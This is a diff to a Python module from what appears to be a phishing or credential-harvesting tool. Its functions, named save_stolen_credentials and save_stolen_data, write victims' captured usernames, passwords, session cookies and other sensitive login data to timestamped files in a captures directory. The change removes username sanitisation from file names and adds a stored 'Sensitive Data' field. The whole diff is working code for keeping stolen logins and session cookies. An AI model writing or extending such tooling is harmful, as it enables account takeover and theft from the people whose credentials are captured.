@@ -13,15 +13,10 @@ def make_captures_dir() -> None:
     """Creates the captures directory if it doesn't exist"""
     get_captures_dir().mkdir(exist_ok=True)
 
-def get_safe_username(username: str) -> str:
-    """Returns a safe version of the username for use in file names"""
-    return sub(r"[^a-zA-Z0-9._-]", "_", username)
-
-def get_file_name(username: str, suffix: str, utc_now: datetime) -> str:
+def get_file_name(suffix: str, utc_now: datetime) -> str:
     """Returns a safe file name for the given username and suffix"""
     utc_now_formatted = utc_now.strftime('%Y%m%dT%H%M%S')
-    safe_username = get_safe_username(username)
-    return f"{utc_now_formatted}-{safe_username}_{suffix}.txt"
+    return f"{utc_now_formatted}_{suffix}.txt"
 
 def save_stolen_credentials(username: str, password: str) -> None:
     """Saves the stolen credentials to a text file in the captures directory"""
@@ -30,7 +25,7 @@ def save_stolen_credentials(username: str, password: str) -> None:
 
         utc_now = datetime.now(timezone.utc)
 
-        file = get_captures_dir() / get_file_name(username, "credentials", utc_now)
+        file = get_captures_dir() / get_file_name("credentials", utc_now)
 
         content = (
             f"Data acquired at: {utc_now} (UTC)\n"
@@ -64,16 +59,18 @@ def save_stolen_data(login_flow: LoginFlow) -> None:
                 "expires": cookie.expires,
                 "http_only": cookie.has_nonstandard_attr("HttpOnly")
             }
-            for cookie in login_flow.session.cookies
+            for cookie in login_flow.session.cookies or []
         ]
+        sensitive_data = login_flow.sensitive_data or {}
 
-        file = get_captures_dir() / get_file_name(username, "data", utc_now)
+        file = get_captures_dir() / get_file_name("data", utc_now)
 
         content = (
             f"Data acquired at: {utc_now} (UTC)\n"
             f"Username: {username}\n"
             f"Password: {password}\n"
             f"Cookies: {dumps(cookies, indent=4)}\n"
+            f"Sensitive Data: {dumps(sensitive_data, indent=4)}\n"
         )
 
         file.write_text(content, encoding="utf-8")
